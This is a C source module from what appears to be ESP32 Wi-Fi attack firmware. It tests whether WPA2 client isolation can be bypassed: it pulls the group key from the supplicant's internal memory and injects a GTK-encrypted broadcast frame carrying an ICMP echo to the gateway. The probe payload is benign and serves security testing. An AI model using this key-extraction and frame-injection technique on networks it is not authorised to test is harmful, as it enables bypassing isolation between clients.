/**
 * @file gtk_abuse.c
 * @brief GTK Abuse Test - Tests if client isolation can be bypassed via GTK
 *
 * Connects to a WPA2 network, reads the GTK from the ESP-IDF supplicant's
 * internal state machine (gWpaSm), then injects a broadcast frame containing
 * a unicast ICMP echo request encrypted with the GTK. If the target responds,
 * client isolation is broken.
 *
 * Based on AirSnitch (Vanhoef, NDSS 2026) research.
 */

#include "attacks/wifi/gtk_abuse.h"
#include "core/wpa_crypto.h"
#include "core/glog.h"
#include "core/system_manager.h"
#include "managers/wifi_manager.h"
#include "managers/status_display_manager.h"
#include "managers/views/terminal_screen.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "lwip/ip4_addr.h"
#include "core/utils.h"
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include "lwip/sockets.h"
#include "lwip/inet.h"

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

#include <string.h>
#include <stdio.h>

extern wifi_ap_record_t selected_ap;

#define PMK_LEN_MAX 64
#define WPA_NONCE_LEN 32
#define WPA_REPLAY_COUNTER_LEN 8
#define WPA_GTK_MAX_LEN 32
#define WPA_KCK_MAX_LEN 24
#define WPA_KEK_MAX_LEN 32
#define WPA_TK_MAX_LEN 32

enum key_flag {
    KEY_FLAG_MODIFY = 1 << 0,
    KEY_FLAG_DEFAULT = 1 << 1,
    KEY_FLAG_RX = 1 << 2,
    KEY_FLAG_TX = 1 << 3,
    KEY_FLAG_GROUP = 1 << 4,
    KEY_FLAG_PAIRWISE = 1 << 5,
    KEY_FLAG_PMK = 1 << 6,
};

enum {
    WIFI_WPA_ALG_CCMP = 3,
};

int esp_wifi_get_sta_key_internal(uint8_t *ifx, int *alg, u8 *addr, int *key_idx,
                                  u8 *key, size_t key_len, enum key_flag key_flag);

struct wpa_ptk {
    u8 kck[WPA_KCK_MAX_LEN];
    u8 kek[WPA_KEK_MAX_LEN];
    u8 tk[WPA_TK_MAX_LEN];
    size_t kck_len;
    size_t kek_len;
    size_t tk_len;
    int installed;
};

struct wpa_gtk {
    u8 gtk[WPA_GTK_MAX_LEN];
    size_t gtk_len;
};

typedef struct {
    u8 pmk[PMK_LEN_MAX];
    size_t pmk_len;
    struct wpa_ptk ptk;
    struct wpa_ptk tptk;
    int ptk_set;
    int tptk_set;
    u8 snonce[WPA_NONCE_LEN];
    u8 anonce[WPA_NONCE_LEN];
    int renew_snonce;
    u8 rx_replay_counter[WPA_REPLAY_COUNTER_LEN];
    int rx_replay_counter_set;
    u8 request_counter[WPA_REPLAY_COUNTER_LEN];
    struct wpa_gtk gtk;
} gtk_wpa_sm_prefix_t;

struct wpa_sm;
extern struct wpa_sm gWpaSm;

static volatile bool gtk_abuse_running = false;
static TaskHandle_t gtk_abuse_task_handle = NULL;
static char *gtk_abuse_args = NULL;

typedef struct {
    uint8_t gtk[WPA_GTK_MAX_LEN];
    size_t gtk_len;
    uint8_t target_ap_bssid[6];
    uint8_t our_sta_mac[6];
    gtk_abuse_result_t result;
} gtk_abuse_ctx_t;

static gtk_abuse_ctx_t *gtk_ctx = NULL;
static gtk_abuse_result_t gtk_last_result = {0};

static void gtk_ctx_free(gtk_abuse_ctx_t *ctx) {
    if (!ctx) return;
    free(ctx);
}

static gtk_abuse_ctx_t *gtk_ctx_alloc(void) {
    gtk_abuse_ctx_t *ctx = calloc(1, sizeof(gtk_abuse_ctx_t));
    return ctx;
}

static bool get_our_ip_and_gw(char *ip_out, size_t ip_sz, char *gw_out, size_t gw_sz) {
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        netif = esp_netif_get_handle_from_ifkey("sta");
    }
    if (!netif) return false;

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) return false;

    ip4addr_ntoa_r((const ip4_addr_t *)&ip_info.ip, ip_out, ip_sz);
    if (gw_out && gw_sz > 0) {
        ip4addr_ntoa_r((const ip4_addr_t *)&ip_info.gw, gw_out, gw_sz);
    }
    return true;
}

static bool wait_for_ip(int timeout_sec) {
    glog("GTK: Waiting for IP address...\n");
    TERMINAL_VIEW_ADD_TEXT("Waiting for IP...\n");
    char ip[16];
    for (int i = 0; i < timeout_sec * 10; i++) {
        if (get_our_ip_and_gw(ip, sizeof(ip), NULL, 0)) {
            glog("GTK: Got IP: %s\n", ip);
            return true;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return false;
}

static bool wait_for_gtk(int timeout_sec) {
    glog("GTK: Waiting for supplicant to install GTK...\n");
    gtk_wpa_sm_prefix_t *sm = (gtk_wpa_sm_prefix_t *)&gWpaSm;
    for (int i = 0; i < timeout_sec * 10; i++) {
        if (sm->gtk.gtk_len > 0) {
            glog("GTK: Supplicant has GTK (%zu bytes)\n", sm->gtk.gtk_len);
            return true;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return false;
}

static bool extract_gtk_from_supplicant(gtk_abuse_ctx_t *ctx) {
    gtk_wpa_sm_prefix_t *sm = (gtk_wpa_sm_prefix_t *)&gWpaSm;

    if (sm->gtk.gtk_len == 0) {
        glog("GTK: Supplicant has no GTK\n");
        return false;
    }

    ctx->gtk_len = sm->gtk.gtk_len;
    memcpy(ctx->gtk, sm->gtk.gtk, ctx->gtk_len);

    glog("GTK: Extracted GTK from supplicant (%zu bytes)\n", ctx->gtk_len);
    return true;
}

static bool validate_gtk_with_driver(gtk_abuse_ctx_t *ctx) {
    if (!ctx || ctx->gtk_len == 0 || ctx->gtk_len > WPA_GTK_MAX_LEN) {
        return false;
    }

    uint8_t ifx = WIFI_IF_STA;
    int alg = -1;
    int key_idx = -1;
    u8 addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    u8 key[WPA_GTK_MAX_LEN] = {0};
    int rc = esp_wifi_get_sta_key_internal(&ifx, &alg, addr, &key_idx, key, sizeof(key),
                                           KEY_FLAG_GROUP | KEY_FLAG_RX);
    if (rc != 0) {
        glog("GTK: Driver GTK validation failed to read key (rc=%d)\n", rc);
        ctx->result.gtk_validation_available = false;
        return false;
    }

    ctx->result.gtk_validation_available = true;

    bool key_match = memcmp(key, ctx->gtk, ctx->gtk_len) == 0;
    bool alg_ok = (alg == WIFI_WPA_ALG_CCMP);

    glog("GTK: Driver validation alg=%d idx=%d match=%s\n",
         alg, key_idx, key_match ? "YES" : "NO");
    return key_match && alg_ok;
}

static uint16_t checksum16(const void *data, size_t len) {
    const uint16_t *words = (const uint16_t *)data;
    uint32_t sum = 0;

    while (len > 1) {
        sum += *words++;
        len -= 2;
    }
    if (len > 0) {
        sum += *(const uint8_t *)words;
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

static bool icmp_reply_matches(const uint8_t *buf, int len, uint16_t id, uint16_t seq) {
    const uint8_t *icmp = NULL;

    if (!buf || len < 8) {
        return false;
    }

    /* lwIP raw ICMP sockets may return either ICMP payload only or IP+ICMP. */
    if (len >= 20 && (buf[0] >> 4) == 4) {
        int ip_hdr_len = (buf[0] & 0x0F) * 4;
        if (ip_hdr_len >= 20 && ip_hdr_len + 8 <= len) {
            icmp = buf + ip_hdr_len;
        }
    }
    if (!icmp) {
        icmp = buf;
    }

    uint8_t type = icmp[0];
    uint16_t recv_id = ((uint16_t)icmp[4] << 8) | icmp[5];
    uint16_t recv_seq = ((uint16_t)icmp[6] << 8) | icmp[7];
    return type == 0 && recv_id == id && recv_seq == seq;
}

static bool wait_for_icmp_reply(const char *target_ip, uint16_t id, uint16_t seq, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        glog("GTK: Failed to create ICMP socket: errno=%d\n", errno);
        return false;
    }

    struct timeval timeout = {
        .tv_sec = timeout_ms / 1000,
        .tv_usec = (timeout_ms % 1000) * 1000,
    };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    struct in_addr expected_addr = {0};
    inet_aton(target_ip, &expected_addr);

    uint8_t recv_buf[256];
    struct sockaddr_in from = {0};
    socklen_t fromlen = sizeof(from);
    bool matched = false;

    for (;;) {
        int r = recvfrom(sock, recv_buf, sizeof(recv_buf), 0, (struct sockaddr *)&from, &fromlen);
        if (r <= 0) {
            break;
        }
        if (from.sin_addr.s_addr != expected_addr.s_addr) {
            continue;
        }

        if (icmp_reply_matches(recv_buf, r, id, seq)) {
            matched = true;
            break;
        }
    }

    close(sock);
    return matched;
}

static bool inject_gtk_test_frame(gtk_abuse_ctx_t *ctx, const char *target_ip, uint16_t *icmp_id_out,
                                  uint16_t *icmp_seq_out) {
    if (ctx->gtk_len != 16) {
        glog("GTK: Need 16-byte GTK for CCMP, got %zu\n", ctx->gtk_len);
        return false;
    }

    uint8_t mac_hdr[24];
    mac_hdr[0] = 0x08;
    mac_hdr[1] = 0x03;
    mac_hdr[2] = 0x00;
    mac_hdr[3] = 0x00;
    memcpy(mac_hdr + 4, ctx->target_ap_bssid, 6);
    memcpy(mac_hdr + 10, ctx->our_sta_mac, 6);
    memset(mac_hdr + 16, 0xFF, 6);
    mac_hdr[22] = 0x00;
    mac_hdr[23] = 0x00;

    uint8_t llc_snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00};

    uint8_t ip_hdr[20];
    memset(ip_hdr, 0, 20);
    ip_hdr[0] = 0x45;
    ip_hdr[1] = 0x00;
    uint16_t total_len = 20 + 8;
    ip_hdr[2] = (total_len >> 8) & 0xFF;
    ip_hdr[3] = total_len & 0xFF;
    esp_fill_random(&ip_hdr[4], 2);
    ip_hdr[6] = 0x00;
    ip_hdr[7] = 0x00;
    ip_hdr[8] = 0x40;
    ip_hdr[9] = 0x01;
    ip_hdr[10] = 0x00;
    ip_hdr[11] = 0x00;

    char our_ip[16] = "192.168.1.1";
    get_our_ip_and_gw(our_ip, sizeof(our_ip), NULL, 0);
    ip4_addr_t src_ip, dst_ip;
    ip4addr_aton(our_ip, &src_ip);
    ip4addr_aton(target_ip, &dst_ip);
    memcpy(ip_hdr + 12, &src_ip, 4);
    memcpy(ip_hdr + 16, &dst_ip, 4);

    ip_hdr[10] = 0x00;
    ip_hdr[11] = 0x00;
    uint32_t sum = 0;
    for (int i = 0; i < 20; i += 2) {
        sum += (ip_hdr[i] << 8) | ip_hdr[i + 1];
    }
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    ip_hdr[10] = (~sum >> 8) & 0xFF;
    ip_hdr[11] = ~sum & 0xFF;

    uint8_t icmp[8];
    memset(icmp, 0, 8);
    icmp[0] = 0x08;
    icmp[1] = 0x00;
    uint16_t icmp_id = (uint16_t)(esp_random() & 0xFFFF);
    uint16_t icmp_seq = (uint16_t)(esp_random() & 0xFFFF);
    icmp[4] = (uint8_t)(icmp_id >> 8);
    icmp[5] = (uint8_t)(icmp_id & 0xFF);
    icmp[6] = (uint8_t)(icmp_seq >> 8);
    icmp[7] = (uint8_t)(icmp_seq & 0xFF);
    uint16_t icmp_csum = checksum16(icmp, sizeof(icmp));
    icmp[2] = (uint8_t)(icmp_csum >> 8);
    icmp[3] = (uint8_t)(icmp_csum & 0xFF);

    uint8_t plain[36];
    memcpy(plain, llc_snap, 8);
    memcpy(plain + 8, ip_hdr, 20);
    memcpy(plain + 28, icmp, 8);

    uint8_t encrypted_frame[128];
    int encrypted_len = 0;
    uint64_t pn = esp_random() | ((uint64_t)esp_random() << 32);

    if (!wpa_ccmp_encrypt(ctx->gtk, (int)ctx->gtk_len, mac_hdr, 24,
                          plain, 36, encrypted_frame, &encrypted_len, pn)) {
        glog("GTK: CCMP encryption failed\n");
        return false;
    }

    encrypted_frame[1] |= 0x40;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, encrypted_frame, encrypted_len, false);
    if (err != ESP_OK) {
        glog("GTK: Frame injection failed: %s\n", esp_err_to_name(err));
        return false;
    }

    if (icmp_id_out) *icmp_id_out = icmp_id;
    if (icmp_seq_out) *icmp_seq_out = icmp_seq;

    glog("GTK: Injected test frame to %s\n", target_ip);
    return true;
}

#define GTK_TASK_EXIT() do { \
    gtk_last_result = ctx->result; \
    gtk_ctx = NULL; \
    gtk_ctx_free(ctx); \
    gtk_abuse_running = false; \
    gtk_abuse_task_handle = NULL; \
    free(param); \
    vTaskDeleteWithCaps(NULL); \
    return; \
} while(0)

static void gtk_abuse_task(void *param) {
    char *args = (char *)param;
    char ssid[33] = {0};
    char password[65] = {0};

    char *sep = strchr(args, '\x1F');
    if (sep) {
        size_t ssid_len = (size_t)(sep - args);
        if (ssid_len >= sizeof(ssid)) ssid_len = sizeof(ssid) - 1;
        memcpy(ssid, args, ssid_len);
        ssid[ssid_len] = '\0';
        strlcpy(password, sep + 1, sizeof(password));
    } else {
        strlcpy(ssid, args, sizeof(ssid));
    }

    gtk_abuse_ctx_t *ctx = gtk_ctx_alloc();
    if (!ctx) {
        glog("GTK Abuse: Failed to allocate context\n");
        TERMINAL_VIEW_ADD_TEXT("GTK: Out of memory\n");
        gtk_abuse_running = false;
        gtk_abuse_task_handle = NULL;
        free(param);
        vTaskDeleteWithCaps(NULL);
        return;
    }
    gtk_ctx = ctx;

    glog("GTK Abuse Test: %s\n", ssid);
    TERMINAL_VIEW_ADD_TEXT("GTK Test: %s\nConnecting...\n", ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("GTK Abuse", "connecting");
#endif

    strlcpy(ctx->result.ssid, ssid, sizeof(ctx->result.ssid));
    esp_wifi_get_mac(WIFI_IF_STA, ctx->our_sta_mac);

    wifi_ap_record_t ap_info = {0};
    bool ap_found = false;
    wifi_manager_start_scan();
    vTaskDelay(pdMS_TO_TICKS(5000));

    uint16_t count = 0;
    wifi_ap_record_t *aps = NULL;
    wifi_manager_get_scan_results_data(&count, &aps);
    if (aps) {
        for (int i = 0; i < count; i++) {
            if (strncmp((const char *)aps[i].ssid, ssid, sizeof(aps[i].ssid)) == 0) {
                ap_info = aps[i];
                ap_found = true;
                memcpy(ctx->target_ap_bssid, ap_info.bssid, 6);
                break;
            }
        }
    }

    if (!ap_found) {
        glog("GTK: AP '%s' not found\n", ssid);
        TERMINAL_VIEW_ADD_TEXT("AP not found\n");
        GTK_TASK_EXIT();
    }

    glog("GTK: Connecting to %s...\n", ssid);
    wifi_manager_connect_wifi(ssid, password);

    if (!wait_for_ip(20)) {
        glog("GTK: Failed to get IP address\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get IP\n");
        GTK_TASK_EXIT();
    }

    TERMINAL_VIEW_ADD_TEXT("Connected!\nExtracting GTK...\n");
    ctx->result.connected = true;
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("GTK Abuse", "extracting GTK");
#endif

    if (!wait_for_gtk(5)) {
        glog("GTK: Supplicant did not install GTK in time\n");
        TERMINAL_VIEW_ADD_TEXT("GTK not available\n");
        GTK_TASK_EXIT();
    }

    if (!extract_gtk_from_supplicant(ctx)) {
        glog("GTK: Failed to extract GTK\n");
        TERMINAL_VIEW_ADD_TEXT("GTK extraction failed\n");
        GTK_TASK_EXIT();
    }

    ctx->result.gtk_validated = validate_gtk_with_driver(ctx);
    if (!ctx->result.gtk_validation_available) {
        glog("GTK: Driver validation unavailable on this build\n");
    } else if (ctx->result.gtk_validated) {
        glog("GTK: Driver validation succeeded\n");
    } else {
        glog("GTK: Driver validation failed\n");
    }

    char our_ip[16], gw_ip[16];
    if (!get_our_ip_and_gw(our_ip, sizeof(our_ip), gw_ip, sizeof(gw_ip))) {
        glog("GTK: Could not get IP info\n");
        GTK_TASK_EXIT();
    }

    glog("GTK: Our IP: %s, Gateway: %s\n", our_ip, gw_ip);
    TERMINAL_VIEW_ADD_TEXT("GTK extracted!\nInjecting test...\n");
    ctx->result.gtk_derived = true;
    strlcpy(ctx->result.our_ip, our_ip, sizeof(ctx->result.our_ip));
    strlcpy(ctx->result.gateway_ip, gw_ip, sizeof(ctx->result.gateway_ip));
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("GTK Abuse", "injecting");
#endif

    uint16_t icmp_id = 0;
    uint16_t icmp_seq = 0;
    bool inject_ok = inject_gtk_test_frame(ctx, gw_ip, &icmp_id, &icmp_seq);
    ctx->result.frame_injected = inject_ok;
    if (!inject_ok) {
        TERMINAL_VIEW_ADD_TEXT("Injection failed\n");
    } else {
        TERMINAL_VIEW_ADD_TEXT("Test frame sent!\nWaiting for reply...\n");
        bool reply_ok = wait_for_icmp_reply(gw_ip, icmp_id, icmp_seq, 3000);
        ctx->result.reply_received = reply_ok;
        ctx->result.isolation_broken = reply_ok;
        glog("GTK: Test complete\n");
        if (reply_ok) {
            glog("GTK: Echo reply received from %s\n", gw_ip);
            glog("GTK: Client isolation is BROKEN on this network.\n");
            TERMINAL_VIEW_ADD_TEXT("Reply received\nISOLATION BROKEN\n");
        } else {
            glog("GTK: No echo reply received from %s\n", gw_ip);
            TERMINAL_VIEW_ADD_TEXT("No reply received\nNo evidence of bypass\n");
        }
    }

#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("GTK Abuse", inject_ok ? "test sent" : "failed");
#endif

    GTK_TASK_EXIT();
}

#undef GTK_TASK_EXIT

void gtk_abuse_start(const char *ssid, const char *password) {
    if (gtk_abuse_running) {
        glog("GTK Abuse already running\n");
        return;
    }

    if (!ssid || ssid[0] == '\0') {
        glog("GTK Abuse: No SSID provided\n");
        return;
    }

    gtk_abuse_running = true;

    size_t args_len = strlen(ssid) + (password ? strlen(password) : 0) + 2;
    char *args = (char *)malloc(args_len);
    if (!args) {
        gtk_abuse_running = false;
        return;
    }
    snprintf(args, args_len, "%s\x1F%s", ssid, password ? password : "");

    BaseType_t rc = xTaskCreate_psram(gtk_abuse_task, "gtk_abuse", 8192, args, 5, &gtk_abuse_task_handle);
    if (rc != pdPASS) {
        glog("GTK Abuse: Failed to start task\n");
        gtk_abuse_running = false;
        free(args);
    } else {
        gtk_abuse_args = args;
    }
}

void gtk_abuse_stop(void) {
    gtk_abuse_running = false;
    vTaskDelay(pdMS_TO_TICKS(100));
    if (gtk_abuse_task_handle) {
        TaskHandle_t h = gtk_abuse_task_handle;
        gtk_abuse_task_handle = NULL;
        vTaskDeleteWithCaps(h);
        if (gtk_abuse_args) {
            free(gtk_abuse_args);
            gtk_abuse_args = NULL;
        }
    }
    if (gtk_ctx) {
        gtk_last_result = gtk_ctx->result;
        gtk_ctx_free((gtk_abuse_ctx_t *)gtk_ctx);
        gtk_ctx = NULL;
    }
    glog("GTK Abuse stopped\n");
}

bool gtk_abuse_is_running(void) {
    return gtk_abuse_running;
}

void gtk_abuse_display(void) {
    if (gtk_abuse_running && gtk_ctx) {
        gtk_abuse_ctx_t *ctx = (gtk_abuse_ctx_t *)gtk_ctx;
        glog("GTK Abuse: Running\n");
        glog("  GTK derived: %s (%zu bytes)\n",
             ctx->gtk_len > 0 ? "YES" : "NO", ctx->gtk_len);
    } else {
        glog("GTK Abuse: Not running\n");
    }
}

const gtk_abuse_result_t *gtk_abuse_get_result(void) {
    if (gtk_ctx) {
        return &gtk_ctx->result;
    }
    return &gtk_last_result;
}
